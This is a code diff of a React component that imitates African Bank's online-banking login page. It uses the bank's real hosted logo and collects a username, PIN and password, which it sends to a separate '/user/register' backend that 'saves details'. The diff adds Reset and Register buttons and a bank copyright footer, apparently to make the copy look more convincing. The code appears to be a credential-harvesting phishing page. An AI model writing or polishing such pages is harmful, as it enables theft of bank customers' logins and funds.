@@ -12,24 +12,19 @@ const AfricanBankLogin = () => {
 
     const handleSubmit = async (e) => {
         e.preventDefault();
-        setLoading(true);           
+        setLoading(true);
         try {
             const response = await axios.post(
                 'http://localhost:4000/user/register',
                 credentials
             );
-            const { message, token } = response.data;
-
-            alert(message); // show success message
-
-            // Optionally, store token (e.g., in localStorage)
-            // localStorage.setItem('token', token);
-
+            const { message } = response.data;
+            alert(message);
             setCredentials({ username: '', pin: '', password: '' });
         } catch (err) {
             alert('Error saving details: ' + (err.response?.data?.message || err.message));
         } finally {
-            setLoading(false);        
+            setLoading(false);
         }
     };
 
@@ -46,7 +41,7 @@ const AfricanBankLogin = () => {
             <div className={styles.logoContainer}>
                 <img
                     src="https://ib.africanbank.co.za/Content/themes/AfricanBank/images/header/ab_dark_logo.svg?289"
-                    alt="African Bank Logo"
+                    alt="Logo"
                     className={styles.bankLogo}
                 />
             </div>
@@ -82,7 +77,7 @@ const AfricanBankLogin = () => {
                             onChange={handleChange}
                             className={styles.inputField}
                             inputMode="numeric"
-                            maxLength="4"
+                            maxLength="5"
                             required
                         />
                     </div>
@@ -104,7 +99,22 @@ const AfricanBankLogin = () => {
                         {loading ? 'Loading...' : 'Login'}
                     </button>
                 </form>
+
+                {/* New buttons below the login form */}
+                <div className={styles.helpSection}>
+                    <span className={styles.helpText}>Forgot login details?</span>
+                    <button className={styles.resetButton}>Reset</button>
+                </div>
+                <div className={styles.helpSection}>
+                    <span className={styles.helpText}>Don’t have an account?</span>
+                    <button className={styles.registerButton}>Register</button>
+                </div>
             </div>
+
+            {/* Footer */}
+            <footer className={styles.footer}>
+                © African Bank Limited - all rights reserved
+            </footer>
         </div>
     );
 };
